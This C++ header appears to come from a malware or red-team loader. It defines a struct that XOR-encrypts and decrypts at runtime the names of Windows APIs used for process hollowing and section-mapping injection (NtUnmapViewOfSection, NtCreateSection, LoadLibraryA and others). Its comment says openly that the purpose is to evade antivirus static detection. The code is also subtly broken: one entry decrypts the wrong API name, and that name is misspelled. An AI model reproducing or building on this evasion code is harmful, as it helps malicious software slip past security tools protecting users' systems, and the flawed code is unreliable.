#pragma once
#include "StringCryptor.h"

// GLOBAL STRING TABLE
// AV may statically detect obfuscated strings being passed to APIs
// Passing pointers into this struct, we can force compile
// indirect references to encrypted data instead.
struct AV_stringTable {

	std::string NtUnmapViewOfSection;
	std::string NtMapViewOfSection;
	std::string NtQueryProrcessInformation;
	std::string NtCreateSection;
	std::wstring Ntdll;
	std::wstring Kernel32;
	std::string LoadLibraryA;
	std::string GetProcAddress;

	std::string wstringtostring(std::wstring ws)
	{
		return std::string(ws.begin(), ws.end());
	}

	AV_stringTable() {
		XorS(sNtUnmapViewOfSection, "NtUnmapViewOfSection");
		XorS(sNtMapViewOfSection, "NtMapViewOfSection");
		XorS(sNtQueryProrcessInformation, "NtMapViewOfSection");
		XorS(sNtCreateSection, "NtCreateSection");
		XorS(sNtdll, "NTDLL");
		XorS(sKernel32, "KERNEL32");
		XorS(sLoadLibraryA, "LOADLIBRARYA");
		XorS(sGetProcAddress, "GETPROCADDRESS");

		NtUnmapViewOfSection = wstringtostring(sNtUnmapViewOfSection.decrypt());
		NtMapViewOfSection = wstringtostring(sNtMapViewOfSection.decrypt());
		NtCreateSection = wstringtostring(sNtCreateSection.decrypt());
		NtQueryProrcessInformation = wstringtostring(sNtQueryProrcessInformation.decrypt());

		Ntdll = sNtdll.decrypt();
		Kernel32 = sKernel32.decrypt();
		LoadLibraryA = wstringtostring(sLoadLibraryA.decrypt());
		GetProcAddress = wstringtostring(sGetProcAddress.decrypt());
	}
};